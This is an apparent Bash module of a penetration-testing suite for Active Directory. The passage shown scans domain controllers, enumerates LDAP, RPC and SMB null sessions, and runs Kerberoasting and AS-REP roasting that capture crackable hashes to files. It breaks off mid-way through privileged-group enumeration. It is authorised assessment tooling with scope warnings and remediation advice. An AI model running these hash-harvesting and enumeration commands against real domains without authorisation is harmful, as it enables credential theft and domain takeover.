#!/usr/bin/env bash
# =============================================================================
# 11_active_directory.sh — Active Directory / Windows Domain Security Testing
# TechGuard Labs | PT-Orc Suite v0.8
# =============================================================================
# NAV: MRK:11_TOC (this block) | MRK:11_ROOT | MRK:11_CONF | MRK:11_LOG
#      MRK:11_ARGS | MRK:11_CONFIRM | MRK:11_TARGETS
#      MRK:11_FIND | MRK:11_UTILS | MRK:11_PROF
#      MRK:11_T01 — T01 DC DISCOVERY & PORT MAP
#      MRK:11_T02 — T02 LDAP ENUMERATION (NULL + AUTH)
#      MRK:11_T03 — T03 NETBIOS / RPC ENUMERATION
#      MRK:11_T04 — T04 SMB NULL SESSION & SHARE ENUM
#      MRK:11_T05 — T05 KERBEROASTING (GetUserSPNs)
#      MRK:11_T06 — T06 AS-REP ROASTING
#      MRK:11_T07 — T07 PASSWORD POLICY ENUMERATION
#      MRK:11_T08 — T08 PRIVILEGED GROUP ENUMERATION
#      MRK:11_T09 — T09 LLMNR / NBT-NS POISONING DETECTION
#      MRK:11_T10 — T10 ADCS TEMPLATE ENUMERATION (ESC1-ESC8)
#      MRK:11_T11 — T11 BLOODHOUND COLLECTION
#      MRK:11_T12 — T12 GPO ENUMERATION
#      MRK:11_T13 — T13 ACL / ADMINSD HOLDER REVIEW
#      MRK:11_T14 — T14 DELEGATION ENUMERATION
#      MRK:11_T15 — T15 DOMAIN TRUST MAPPING
#      MRK:11_T16 — T16 PASSWORD SPRAYING (DEEP ONLY)
#      MRK:11_T17 — T17 DCSYNC RIGHTS CHECK
#      MRK:11_T18 — T18 KERBEROS TICKET / HASH ATTACK SURFACE
#      MRK:11_TRUN | MRK:11_MAIN
# =============================================================================

# - MRK:11_ROOT
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# - MRK:11_CONF
CONF_FILE="${SCRIPT_DIR}/pt-orc.conf"
[[ -f "$CONF_FILE" ]] || { echo "[FATAL] pt-orc.conf not found at ${CONF_FILE}"; exit 1; }
# shellcheck source=pt-orc.conf
source "$CONF_FILE"

LIB_FILE="${SCRIPT_DIR}/orc-common-lib.sh"
[[ -f "$LIB_FILE" ]] && source "$LIB_FILE"

PROJ_SLUG="${PROJECT_NAME//[^A-Za-z0-9._-]/_}"
EVIDENCE_BASE="${SCRIPT_DIR}/evidence/${PROJ_SLUG}"
DRY_RUN=0
SCAN_PROFILE="${SCAN_PROFILE:-standard}"
AD_TIMEOUT=30

# - MRK:11_LOG
_R='\033[0;31m'; _G='\033[0;32m'; _Y='\033[1;33m'; _B='\033[0;34m'; _C='\033[0;36m'; _W='\033[1;37m'; _N='\033[0m'
SESSION_TS="$(date +%Y%m%d_%H%M%S)"
LOG_FILE="${SCRIPT_DIR}/working/${PROJ_SLUG}_11_ad_${SESSION_TS}.log"
mkdir -p "${SCRIPT_DIR}/working" "${EVIDENCE_BASE}"

_log()    { local ts; ts="$(date +%H:%M:%S)"; printf "[%s] %s\n" "$ts" "$*" | tee -a "$LOG_FILE"; }
log_ok()  { printf "${_G}[+]${_N} %s\n" "$*" | tee -a "$LOG_FILE"; }
log_inf() { printf "${_B}[*]${_N} %s\n" "$*" | tee -a "$LOG_FILE"; }
log_wrn() { printf "${_Y}[!]${_N} %s\n" "$*" | tee -a "$LOG_FILE"; }
log_err() { printf "${_R}[-]${_N} %s\n" "$*" | tee -a "$LOG_FILE"; }
log_dry() { printf "${_C}[DRY]${_N} %s\n" "$*" | tee -a "$LOG_FILE"; }

# - MRK:11_ARGS
_SKIP_CONFIRM=0
_ONLY_TESTS=()
_SKIP_TESTS=()
_LLMNR_ACTIVE=0   # LLMNR/NBT-NS Responder is opt-in only

_usage() {
    cat <<EOF
Usage: $0 [OPTIONS]

Active Directory / Windows Domain Security Testing (step 11)

Requires AD_DOMAIN and AD_DC_IP in pt-orc.conf (or via CLI flags).

Options:
  --domain <FQDN>         Domain FQDN (overrides AD_DOMAIN from conf)
  --dc <IP>               Domain controller IP (overrides AD_DC_IP)
  --user <username>       AD username for authenticated tests
  --pass <password>       AD password
  --hash <NTHASH>         NT hash (alternative to --pass)
  -p, --profile <name>    Scan profile: quick|standard|deep  [default: standard]
  --only <T01,T05,...>    Run only specified tests
  --skip <T11,T16,...>    Skip specified tests
  --llmnr-active          Enable active LLMNR/NBT-NS probe (sends network packets — explicit opt-in)
  -y, --yes               Skip confirmation prompt
  --dry-run               Print actions without executing
  -h, --help              Show this help

WARNING: Password spraying (T16) is disabled by default. Enable with AD_SPRAY_ENABLED=1
         in pt-orc.conf AND --profile deep. One guess per account maximum.
EOF
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --domain)       AD_DOMAIN="$2"; shift 2 ;;
        --dc)           AD_DC_IP="$2"; shift 2 ;;
        --user)         AD_USERNAME="$2"; shift 2 ;;
        --pass)         AD_PASSWORD="$2"; shift 2 ;;
        --hash)         AD_NT_HASH="$2"; shift 2 ;;
        -p|--profile)   SCAN_PROFILE="$2"; shift 2 ;;
        --only)         IFS=',' read -ra _ONLY_TESTS <<< "$2"; shift 2 ;;
        --skip)         IFS=',' read -ra _SKIP_TESTS <<< "$2"; shift 2 ;;
        --llmnr-active) _LLMNR_ACTIVE=1; shift ;;
        -y|--yes)       _SKIP_CONFIRM=1; shift ;;
        --dry-run)      DRY_RUN=1; shift ;;
        -h|--help)      _usage; exit 0 ;;
        *)              log_err "Unknown option: $1"; _usage; exit 1 ;;
    esac
done

# Derive base DN if not set
_derive_base_dn() {
    local dom="${AD_DOMAIN:-}"
    [[ -z "$dom" ]] && { echo ""; return; }
    echo "DC=${dom//.//DC=}" | sed 's|/|,|g; s|DC=|DC=|g'
}
AD_BASE_DN="${AD_BASE_DN:-$(_derive_base_dn)}"

# Credential string for impacket tools
_CRED_STR=""
_HAS_CREDS=0
if [[ -n "${AD_USERNAME:-}" && -n "${AD_PASSWORD:-}" ]]; then
    _CRED_STR="${AD_DOMAIN}/${AD_USERNAME}:${AD_PASSWORD}"
    _HAS_CREDS=1
elif [[ -n "${AD_USERNAME:-}" && -n "${AD_NT_HASH:-}" ]]; then
    _CRED_STR="${AD_DOMAIN}/${AD_USERNAME} --hashes :${AD_NT_HASH}"
    _HAS_CREDS=1
fi

# - MRK:11_CONFIRM
_confirm() {
    [[ "$_SKIP_CONFIRM" -eq 1 ]] && return 0
    printf "\n${_Y}[CONFIRM]${_N} Active Directory testing. Profile: ${_W}%s${_N}\n" "$SCAN_PROFILE"
    printf "  Project  : %s\n" "$PROJECT_NAME"
    printf "  Domain   : %s\n" "${AD_DOMAIN:-<not set>}"
    printf "  DC IP    : %s\n" "${AD_DC_IP:-<not set>}"
    printf "  Username : %s\n" "${AD_USERNAME:-<none — null session only>}"
    printf "  Auth     : %s\n" "$( [[ "$_HAS_CREDS" -eq 1 ]] && echo "authenticated" || echo "null session / unauthenticated" )"
    printf "\n  ${_R}WARNING:${_N} This script sends active packets to AD infrastructure.\n"
    printf "  Only run within authorised scope and agreed engagement window.\n"
    printf "\n  Continue? [y/N] "
    read -r _ans
    [[ "${_ans,,}" == "y" ]] || { log_err "Aborted by user."; exit 0; }
}

# - MRK:11_TARGETS
_validate_config() {
    local ok=1
    if [[ -z "${AD_DC_IP:-}" ]]; then
        log_err "AD_DC_IP is not set. Set it in pt-orc.conf or use --dc <IP>."
        ok=0
    fi
    if [[ -z "${AD_DOMAIN:-}" ]]; then
        log_err "AD_DOMAIN is not set. Set it in pt-orc.conf or use --domain <FQDN>."
        ok=0
    fi
    [[ "$ok" -eq 1 ]]
}

# - MRK:11_FIND
FINDINGS_FILE="${SCRIPT_DIR}/working/${PROJ_SLUG}_11_ad_findings_${SESSION_TS}.jsonl"
_FIND_CTR=0

emit_finding() {
    local sev="$1" title="$2" desc="$3" rec="$4" ev_tag="${5:-}"
    (( _FIND_CTR++ )) || true
    local fid
    fid="11_ad_$(printf '%04d' "$_FIND_CTR")"
    local payload
    payload=$(printf '{"id":"%s","title":"%s","severity":"%s","phase":"11_ad","description":"%s","recommendation":"%s","evidence_tag":"%s","ts":"%s"}' \
        "$fid" \
        "${title//\"/\\\"}" \
        "$sev" \
        "${desc//\"/\\\"}" \
        "${rec//\"/\\\"}" \
        "$ev_tag" \
        "$(date -u +%Y-%m-%dT%H:%M:%SZ)")
    echo "$payload" >> "$FINDINGS_FILE"
    log_wrn "FINDING [${sev^^}] ${title}"
}

# - MRK:11_UTILS
_check_tool() {
    local tool="$1"
    command -v "$tool" &>/dev/null
}

_ev_file() {
    local tag="$1"
    echo "${EVIDENCE_BASE}/${tag}_${SESSION_TS}.txt"
}

_run_impacket() {
    # Run an impacket command, capturing output and errors
    local cmd="$1"; shift
    if [[ "$DRY_RUN" -eq 1 ]]; then
        log_dry "impacket: ${cmd} $*"
        return 1
    fi
    timeout "$AD_TIMEOUT" "$cmd" "$@" 2>&1 || true
}

declare -A _T_ENABLED
_test_skip() {
    local n="$1"
    [[ "${_T_ENABLED[$n]:-1}" -eq 0 ]] && return 0
    return 1
}

_apply_cli_filters() {
    if [[ ${#_ONLY_TESTS[@]} -gt 0 ]]; then
        for k in "${!_T_ENABLED[@]}"; do _T_ENABLED[$k]=0; done
        for t in "${_ONLY_TESTS[@]}"; do _T_ENABLED["${t^^}"]=1; done
    fi
    for t in "${_SKIP_TESTS[@]+"${_SKIP_TESTS[@]}"}"; do
        _T_ENABLED["${t^^}"]=0
    done
}

# - MRK:11_PROF
setup_profile() {
    local prof="${1:-standard}"
    for n in T01 T02 T03 T04 T05 T06 T07 T08 T09 T10 T11 T12 T13 T14 T15 T16 T17 T18; do
        _T_ENABLED[$n]=1
    done
    case "$prof" in
        quick)
            # Quick: DC discovery, LDAP null, SMB shares, password policy, privilege groups
            for n in T05 T06 T09 T10 T11 T12 T13 T14 T15 T16 T17 T18; do _T_ENABLED[$n]=0; done ;;
        standard)
            # Standard: everything except BloodHound, spray, active LLMNR
            for n in T09 T11 T16; do _T_ENABLED[$n]=0; done ;;
        deep)
            # All enabled — but T16 still gated by AD_SPRAY_ENABLED conf var
            : ;;
        *)
            log_wrn "Unknown profile '${prof}' — defaulting to standard"
            for n in T09 T11 T16; do _T_ENABLED[$n]=0; done ;;
    esac
    # T09 always requires explicit --llmnr-active flag
    [[ "$_LLMNR_ACTIVE" -eq 0 ]] && _T_ENABLED[T09]=0
    _apply_cli_filters
}

# =============================================================================
# TESTS
# =============================================================================

# - MRK:11_T01 — T01 DC DISCOVERY & PORT MAP
test_T01_dc_discovery() {
    local dc="${AD_DC_IP}"
    local ev_f; ev_f="$(_ev_file "dc_discovery")"

    log_inf "[T01] DC discovery and port map → ${dc}"
    [[ "$DRY_RUN" -eq 1 ]] && { log_dry "nmap -sV -p 53,88,135,139,389,445,464,636,3268,3269,5985,9389 ${dc}"; return; }

    {
        echo "=== T01 DC Discovery & Port Map ==="
        echo "DC: ${dc}"
        echo "Domain: ${AD_DOMAIN}"
    } > "$ev_f"

    if ! _check_tool nmap; then
        log_wrn "  nmap not found — using nc for basic port check"
        local -a ad_ports=(53 88 135 139 389 445 464 636 3268 3269 5985 9389)
        for port in "${ad_ports[@]}"; do
            if nc -zw3 "$dc" "$port" 2>/dev/null; then
                echo "OPEN: ${dc}:${port}" >> "$ev_f"
            fi
        done
    else
        local nmap_out
        nmap_out=$(timeout 120 nmap -sV --open -p 53,88,135,139,389,445,464,636,3268,3269,5985,9389 \
            -oN - "$dc" 2>/dev/null)
        echo "$nmap_out" >> "$ev_f"

        # Check for critical AD ports
        if echo "$nmap_out" | grep -qE '88/tcp.*open'; then
            log_ok "  Kerberos (88/tcp) open — confirmed DC"
        fi
        if echo "$nmap_out" | grep -qE '5985/tcp.*open'; then
            log_wrn "  WinRM (5985/tcp) open — lateral movement surface"
            emit_finding "medium" \
                "WinRM Accessible on DC" \
                "Windows Remote Management (WinRM/HTTP) port 5985 is open on DC ${dc}. This may allow remote command execution with valid credentials." \
                "Restrict WinRM access to authorised management hosts via Windows Firewall rules. Require HTTPS WinRM (5986) only." \
                "dc_discovery_winrm"
        fi
        if echo "$nmap_out" | grep -qE '9389/tcp.*open'; then
            log_inf "  AD Web Services (9389/tcp) open"
        fi
    fi
    log_ok "  DC port scan complete — see ${ev_f}"
}

# - MRK:11_T02 — T02 LDAP ENUMERATION (NULL + AUTH)
test_T02_ldap_enum() {
    local dc="${AD_DC_IP}"
    local ev_f; ev_f="$(_ev_file "ldap_enum")"

    log_inf "[T02] LDAP enumeration → ${dc}"
    [[ "$DRY_RUN" -eq 1 ]] && { log_dry "ldapsearch null-session + auth on ${dc}"; return; }

    {
        echo "=== T02 LDAP Enumeration ==="
        echo "DC: ${dc}  Domain: ${AD_DOMAIN}  BaseDN: ${AD_BASE_DN}"
    } > "$ev_f"

    # Null session LDAP query
    if _check_tool ldapsearch; then
        local null_out
        null_out=$(timeout "$AD_TIMEOUT" ldapsearch -x -H "ldap://${dc}" -b "" \
            -s base "(objectClass=*)" namingContexts supportedSASLMechanisms 2>&1 | head -50)
        echo "--- Null Session ---" >> "$ev_f"
        echo "$null_out" >> "$ev_f"

        if echo "$null_out" | grep -qiE 'namingContexts|defaultNamingContext'; then
            emit_finding "medium" \
                "LDAP Null Session Enumeration Possible" \
                "Anonymous LDAP bind to ${dc} returned directory metadata including naming contexts. Unauthenticated enumeration of the AD structure is possible." \
                "Disable anonymous LDAP bind (set 'dsHeuristics' bit 7 to 0). Restrict LDAP access to authenticated users only." \
                "ldap_null_session"
            log_wrn "  LDAP null session: naming contexts disclosed"
        else
            log_ok "  LDAP null session: no useful data returned"
        fi

        # Authenticated LDAP enumeration
        if [[ "$_HAS_CREDS" -eq 1 ]]; then
            local auth_out
            auth_out=$(timeout "$AD_TIMEOUT" ldapsearch -x -H "ldap://${dc}" \
                -D "${AD_USERNAME}@${AD_DOMAIN}" -w "${AD_PASSWORD:-}" \
                -b "${AD_BASE_DN}" "(objectClass=user)" \
                sAMAccountName userPrincipalName memberOf adminCount 2>&1 | head -200)
            echo "--- Authenticated Enum ---" >> "$ev_f"
            echo "$auth_out" >> "$ev_f"

            local user_count
            user_count=$(echo "$auth_out" | grep -c 'dn:' || echo 0)
            log_ok "  Authenticated LDAP: ${user_count} user entries retrieved"

            # Detect accounts with adminCount=1 (protected users)
            local admin_users
            admin_users=$(echo "$auth_out" | grep -B5 'adminCount: 1' | grep 'sAMAccountName' | head -20 || true)
            if [[ -n "$admin_users" ]]; then
                echo "AdminCount=1 accounts: ${admin_users}" >> "$ev_f"
                log_inf "  AdminCount=1 accounts found: ${user_count} — review for over-privilege"
            fi
        fi
    else
        log_wrn "  ldapsearch not found — install ldap-utils for T02"
    fi
}

# - MRK:11_T03 — T03 NETBIOS / RPC ENUMERATION
test_T03_netbios_rpc() {
    local dc="${AD_DC_IP}"
    local ev_f; ev_f="$(_ev_file "netbios_rpc")"

    log_inf "[T03] NetBIOS / RPC enumeration → ${dc}"
    [[ "$DRY_RUN" -eq 1 ]] && { log_dry "enum4linux-ng or rpcclient on ${dc}"; return; }

    {
        echo "=== T03 NetBIOS / RPC Enumeration ==="
        echo "DC: ${dc}"
    } > "$ev_f"

    if _check_tool enum4linux-ng; then
        local cred_args=""
        [[ "$_HAS_CREDS" -eq 1 ]] && cred_args="-u ${AD_USERNAME} -p ${AD_PASSWORD:-}"
        local out
        # shellcheck disable=SC2086
        out=$(timeout 120 enum4linux-ng -A $cred_args "$dc" 2>&1 | head -500)
        echo "$out" >> "$ev_f"

        if echo "$out" | grep -qiE '\[+\] Null session|null session allowed'; then
            emit_finding "medium" \
                "NetBIOS / RPC Null Session Permitted" \
                "NetBIOS/RPC null sessions are accepted by DC ${dc}. Domain user list, group memberships, and shares may be enumerable without credentials." \
                "Restrict anonymous access via Group Policy: Network Access: Do not allow anonymous enumeration of SAM accounts and shares." \
                "netbios_null_session"
            log_wrn "  NetBIOS null session: accepted"
        fi

        if echo "$out" | grep -qiE 'password.{0,30}never.{0,10}expir|DONT_EXPIRE_PASSWORD'; then
            log_wrn "  Accounts with non-expiring passwords detected"
        fi
    elif _check_tool rpcclient; then
        # Fallback to rpcclient
        local rpc_out
        rpc_out=$(timeout 20 rpcclient -U "" -N "$dc" -c "enumdomusers" 2>&1 | head -100)
        echo "$rpc_out" >> "$ev_f"
        if echo "$rpc_out" | grep -qiE 'user:\['; then
            emit_finding "medium" \
                "RPC Null Session: User Enumeration" \
                "rpcclient null session to ${dc} returned a user list. Enumerated accounts can be used for targeted credential attacks." \
                "Block anonymous RPC access via firewall rules. Enable Restrict Anonymous registry key." \
                "netbios_rpc_user_enum"
            log_wrn "  RPC null session: user enumeration succeeded"
        fi
    else
        log_wrn "  enum4linux-ng and rpcclient not found — install samba-common-bin or enum4linux-ng"
    fi
}

# - MRK:11_T04 — T04 SMB NULL SESSION & SHARE ENUMERATION
test_T04_smb_shares() {
    local dc="${AD_DC_IP}"
    local ev_f; ev_f="$(_ev_file "smb_shares")"

    log_inf "[T04] SMB null session / share enumeration → ${dc}"
    [[ "$DRY_RUN" -eq 1 ]] && { log_dry "smbclient -L //${dc} -N"; return; }

    {
        echo "=== T04 SMB Null Session & Share Enum ==="
        echo "DC: ${dc}"
    } > "$ev_f"

    if _check_tool smbclient; then
        local shares_null
        shares_null=$(timeout 30 smbclient -L "//${dc}" -N 2>&1 | head -100)
        echo "--- Null Session Share Listing ---" >> "$ev_f"
        echo "$shares_null" >> "$ev_f"

        if echo "$shares_null" | grep -qiE 'Sharename|ADMIN\$|IPC\$|SYSVOL|NETLOGON'; then
            log_ok "  SMB shares visible"

            # Check for non-default readable shares
            local -a readable_shares=()
            while IFS= read -r line; do
                local sharename
                sharename=$(echo "$line" | awk '{print $1}')
                [[ "$sharename" =~ ^(ADMIN|IPC|PRINT|SYSVOL|NETLOGON)$ ]] && continue
                if timeout 10 smbclient "//${dc}/${sharename}" -N -c "ls" &>/dev/null; then
                    readable_shares+=("$sharename")
                fi
            done < <(echo "$shares_null" | grep -E '^\s+\w' | awk '{print $1}')

            if [[ ${#readable_shares[@]} -gt 0 ]]; then
                emit_finding "high" \
                    "SMB Shares Readable Without Authentication: ${readable_shares[*]}" \
                    "Share(s) [${readable_shares[*]}] on ${dc} are readable via null session (no credentials required). Files may be accessible or writeable." \
                    "Review permissions on all non-default shares. Remove anonymous read access. Audit share contents for sensitive data." \
                    "smb_shares_null"
                log_wrn "  Null-readable shares: ${readable_shares[*]}"
            fi
        fi

        # Authenticated share check
        if [[ "$_HAS_CREDS" -eq 1 ]]; then
            local shares_auth
            shares_auth=$(timeout 30 smbclient -L "//${dc}" \
                -U "${AD_USERNAME}%${AD_PASSWORD:-}" 2>&1 | head -100)
            echo "--- Authenticated Share Listing ---" >> "$ev_f"
            echo "$shares_auth" >> "$ev_f"
            log_ok "  Authenticated SMB share listing complete"
        fi
    else
        log_wrn "  smbclient not found — install samba-client"
    fi

    # crackmapexec share enum (if available)
    if _check_tool crackmapexec; then
        local cme_out
        cme_out=$(timeout 60 crackmapexec smb "$dc" --shares -u "" -p "" 2>&1 | head -80)
        echo "--- CME Share Enum ---" >> "$ev_f"
        echo "$cme_out" >> "$ev_f"
        if echo "$cme_out" | grep -qi 'READ\|WRITE'; then
            log_inf "  CME identified readable/writable shares — see evidence"
        fi
    fi
}

# - MRK:11_T05 — T05 KERBEROASTING (GetUserSPNs)
test_T05_kerberoasting() {
    local dc="${AD_DC_IP}"
    local ev_f; ev_f="$(_ev_file "kerberoasting")"

    log_inf "[T05] Kerberoasting (GetUserSPNs) → ${dc}"

    if [[ "${AD_KERBEROAST:-1}" -eq 0 ]]; then
        log_inf "  AD_KERBEROAST=0 — skipping (disabled in conf)"
        return
    fi

    [[ "$DRY_RUN" -eq 1 ]] && { log_dry "GetUserSPNs.py ${AD_DOMAIN}/${AD_USERNAME} -dc-ip ${dc}"; return; }

    {
        echo "=== T05 Kerberoasting ==="
        echo "DC: ${dc}  Domain: ${AD_DOMAIN}"
    } > "$ev_f"

    if ! _check_tool GetUserSPNs.py && ! _check_tool impacket-GetUserSPNs; then
        log_wrn "  GetUserSPNs.py not found — install impacket"
        return
    fi

    local spn_tool
    _check_tool GetUserSPNs.py && spn_tool="GetUserSPNs.py" || spn_tool="impacket-GetUserSPNs"

    if [[ "$_HAS_CREDS" -eq 0 ]]; then
        # Try null-session SPN enumeration (no TGS request — just listing)
        local null_spn
        null_spn=$(timeout 30 "$spn_tool" "${AD_DOMAIN}/" -no-pass -dc-ip "$dc" 2>&1 | head -100)
        echo "$null_spn" >> "$ev_f"
        if echo "$null_spn" | grep -qi 'ServicePrincipalName'; then
            log_inf "  SPN accounts visible without credentials — Kerberoasting may be possible"
        fi
        return
    fi

    local spn_hash_file="${EVIDENCE_BASE}/kerberoast_hashes_${SESSION_TS}.txt"
    local spn_out
    spn_out=$(timeout 60 "$spn_tool" "${_CRED_STR}" -dc-ip "$dc" \
        -outputfile "$spn_hash_file" 2>&1)
    echo "$spn_out" >> "$ev_f"

    if [[ -s "$spn_hash_file" ]]; then
        local hash_count
        hash_count=$(grep -c '^\$krb5tgs\$' "$spn_hash_file" 2>/dev/null || echo 0)
        emit_finding "high" \
            "Kerberoastable Service Accounts Found: ${hash_count} TGS hashes" \
            "${hash_count} service account TGS tickets captured. Offline cracking may yield plaintext service account passwords, enabling privilege escalation or lateral movement." \
            "Use strong, unique passwords (25+ chars) for all service accounts. Prefer gMSA accounts. Remove unnecessary SPNs. Audit SPN assignments regularly." \
            "kerberoasting"
        log_wrn "  Kerberoasting: ${hash_count} TGS hashes captured → ${spn_hash_file}"
    else
        log_ok "  Kerberoasting: no roastable accounts or hashes obtained"
    fi
}

# - MRK:11_T06 — T06 AS-REP ROASTING
test_T06_asrep_roasting() {
    local dc="${AD_DC_IP}"
    local ev_f; ev_f="$(_ev_file "asrep_roasting")"

    log_inf "[T06] AS-REP Roasting → ${dc}"

    if [[ "${AD_ASREP_ROAST:-1}" -eq 0 ]]; then
        log_inf "  AD_ASREP_ROAST=0 — skipping"
        return
    fi

    [[ "$DRY_RUN" -eq 1 ]] && { log_dry "GetNPUsers.py ${AD_DOMAIN}/ -dc-ip ${dc} -no-pass"; return; }

    {
        echo "=== T06 AS-REP Roasting ==="
        echo "DC: ${dc}  Domain: ${AD_DOMAIN}"
    } > "$ev_f"

    local npusers_tool
    if _check_tool GetNPUsers.py; then
        npusers_tool="GetNPUsers.py"
    elif _check_tool impacket-GetNPUsers; then
        npusers_tool="impacket-GetNPUsers"
    else
        log_wrn "  GetNPUsers.py not found — install impacket"
        return
    fi

    local hash_file="${EVIDENCE_BASE}/asrep_hashes_${SESSION_TS}.txt"
    local asrep_out

    if [[ "$_HAS_CREDS" -eq 1 ]]; then
        # With creds: enumerate all accounts with DONT_REQ_PREAUTH
        asrep_out=$(timeout 60 "$npusers_tool" "${_CRED_STR}" -dc-ip "$dc" \
            -format hashcat -outputfile "$hash_file" 2>&1)
    else
        # Without creds: requires a username list
        if [[ -n "${AD_SPRAY_USER_LIST:-}" && -f "${AD_SPRAY_USER_LIST}" ]]; then
            asrep_out=$(timeout 60 "$npusers_tool" "${AD_DOMAIN}/" -no-pass \
                -dc-ip "$dc" -usersfile "${AD_SPRAY_USER_LIST}" \
                -format hashcat -outputfile "$hash_file" 2>&1)
        else
            log_inf "  AS-REP: no credentials and no AD_SPRAY_USER_LIST set — null-enum only"
            asrep_out=$(timeout 30 "$npusers_tool" "${AD_DOMAIN}/" -no-pass \
                -dc-ip "$dc" -format hashcat 2>&1 | head -50)
        fi
    fi

    echo "$asrep_out" >> "$ev_f"

    if [[ -s "$hash_file" ]]; then
        local hash_count
        hash_count=$(grep -c '^\$krb5asrep\$' "$hash_file" 2>/dev/null || echo 0)
        emit_finding "high" \
            "AS-REP Roastable Accounts Found: ${hash_count} hashes" \
            "${hash_count} accounts have Kerberos pre-authentication disabled (DONT_REQUIRE_PREAUTH). AS-REP hashes can be cracked offline to obtain plaintext passwords." \
            "Enable Kerberos pre-authentication on all user accounts. Audit 'Do not require Kerberos preauthentication' attribute. Use strong passwords on any accounts where it is required." \
            "asrep_roasting"
        log_wrn "  AS-REP Roasting: ${hash_count} hashes → ${hash_file}"
    else
        log_ok "  AS-REP Roasting: no vulnerable accounts found"
    fi
}

# - MRK:11_T07 — T07 PASSWORD POLICY ENUMERATION
test_T07_password_policy() {
    local dc="${AD_DC_IP}"
    local ev_f; ev_f="$(_ev_file "password_policy")"

    log_inf "[T07] Password policy enumeration → ${dc}"
    [[ "$DRY_RUN" -eq 1 ]] && { log_dry "crackmapexec smb ${dc} --pass-pol"; return; }

    {
        echo "=== T07 Password Policy ==="
        echo "DC: ${dc}"
    } > "$ev_f"

    local policy_out=""

    # Try crackmapexec first
    if _check_tool crackmapexec; then
        local cme_args=("-u" "" "-p" "")
        [[ "$_HAS_CREDS" -eq 1 ]] && cme_args=("-u" "${AD_USERNAME}" "-p" "${AD_PASSWORD:-}")
        # shellcheck disable=SC2154
        policy_out=$(timeout 30 crackmapexec smb "$dc" --pass-pol "${cme_args[@]}" 2>&1 | head -60)
        echo "$policy_out" >> "$ev_f"
    fi

    # Fallback to net rpc
    if [[ -z "$policy_out" ]] && _check_tool net; then
        policy_out=$(timeout 20 net rpc pwpolicy show -I "$dc" -U "%" 2>&1 | head -30)
        echo "$policy_out" >> "$ev_f"
    fi

    # Parse and evaluate
    local lockout_threshold
    lockout_threshold=$(echo "$policy_out" | grep -iE 'lockout.{0,20}threshold|Account lockout threshold' | grep -oE '[0-9]+' | head -1 || echo "")
    local min_pwd_length
    min_pwd_length=$(echo "$policy_out" | grep -iE 'min.{0,20}password.{0,20}len|Minimum password length' | grep -oE '[0-9]+' | head -1 || echo "")
    local pwd_history
    pwd_history=$(echo "$policy_out" | grep -iE 'history|enforce.{0,20}password.{0,20}history' | grep -oE '[0-9]+' | head -1 || echo "")

    {
        echo "Lockout threshold : ${lockout_threshold:-unknown}"
        echo "Min pwd length    : ${min_pwd_length:-unknown}"
        echo "Password history  : ${pwd_history:-unknown}"
    } >> "$ev_f"

    # Weak policy checks
    if [[ -n "$lockout_threshold" ]] && [[ "$lockout_threshold" -eq 0 ]]; then
        emit_finding "high" \
            "Account Lockout Disabled (threshold=0)" \
            "No account lockout threshold is configured on ${AD_DOMAIN}. Brute-force and password spray attacks can proceed without triggering lockouts." \
            "Set account lockout threshold to 5-10 attempts. Enable lockout duration and observation window via Default Domain Policy." \
            "password_policy"
    elif [[ -n "$lockout_threshold" ]] && [[ "$lockout_threshold" -gt 10 ]]; then
        emit_finding "medium" \
            "Weak Account Lockout Threshold: ${lockout_threshold}" \
            "Account lockout threshold of ${lockout_threshold} allows many guesses before locking out. Password spraying with a low-and-slow cadence may succeed undetected." \
            "Reduce lockout threshold to 5-10 attempts. Use Fine-Grained Password Policies (PSO) for privileged accounts." \
            "password_policy"
    fi

    if [[ -n "$min_pwd_length" ]] && [[ "$min_pwd_length" -lt 12 ]]; then
        emit_finding "medium" \
            "Minimum Password Length Insufficient: ${min_pwd_length} chars" \
            "Domain minimum password length of ${min_pwd_length} characters is below the recommended 12-character minimum. Short passwords increase cracking success." \
            "Set minimum password length to at least 12 characters. Consider passphrase policies for user accounts." \
            "password_policy"
    fi

    log_ok "  Password policy enumeration complete"
}

# - MRK:11_T08 — T08 PRIVILEGED GROUP ENUMERATION
test_T08_priv_groups() {
    local dc="${AD_DC_IP}"
    local ev_f; ev_f="$(_ev_file "priv_groups")"

    log_inf "[T08] Privileged group enumeration → ${dc}"
    [[ "$DRY_RUN" -eq 1 ]] && { log_dry "ldapsearch privileged groups on ${dc}"; return; }

    {
        echo "=== T08 Privileged Group Enumeration ==="
        echo "DC: ${dc}  BaseDN: ${AD_BASE_DN}"
    } > "$ev_f"

    local -a priv_groups=("Domain Admins" "Enterprise Admins" "Schema Admins" "Administrators" "Account Operators" "Backup Operators" "Print Operators" "Server Operators" "Group Policy Creator Owners" "DnsAdmins" "Remote Desktop Users" "Distributed COM Users")

    if ! _check_tool ldapsearch; then
        log_wrn "  ldapsearch not found — using rpcclient fallback"
        if _check_tool rpcclient && [[ "$_HAS_CREDS" -eq 1 ]]; then
            for grp in "Domain Admins" "Enterprise Admins" "Administrators"; do
                local grp_out
                grp_out=$(timeout 15 rpcclient -U "${AD_USERNAME}%${AD_PASSWORD:-}" "$dc" \
                    -c "enumalsgroups builtin" 2>&1 | head -30)
                echo "${grp}: ${grp_out}" >> "$ev_f"
            done
        fi
        return
    fi

    local bind_args=("-x" "-H" "ldap://${dc}")
    [[ "$_HAS_CREDS" -eq 1 ]] && bind_args+=("-D" "${AD_USERNAME}@${AD_DOMAIN}" "-w" "${AD_PASSWORD:-}")

    local over_populated_count=0
    for grp in "${priv_groups[@]}"; do
        local grp_out member_count
        grp_out=$(timeout 20 ldapsearch "${bind_args[@]}" -b "${AD_BASE_DN}" \
            "(cn=${grp})" member 2>&1 | head -80)
        member_count=$(echo "$grp_out" | grep -c '^member:' || echo 0)
        echo "${grp}: ${member_count} members" >> "$ev_f"

        if [[ "$member_count" -gt 0 ]]; then
            log_inf "  ${grp}: ${member_count} member(s)"
        fi

        # Flag DA/EA with excessive membership
        if [[ "$grp" == "Domain Admins" ]] && [[ "$member_count" -gt 5 ]]; then
            emit_finding "medium" \
                "Excessive Domain Admins Membership: ${member_count} members" \
                "'Domain Admins' has ${member_count} members — a high count increases the attack surface for privilege escalation." \
                "Reduce Domain Admins to the minimum necessary accounts. Use tiered admin model. Audit DA membership monthly." \
                "priv_groups_da_count"
            (( over_populated_count++ )) || true
        fi
        if [[ "$grp" == "DnsAdmins" ]] && [[ "$member_count" -gt 0 ]]; then
            emit_finding "high" \
                "DnsAdmins Group Members: ${member_count} account(s)" \
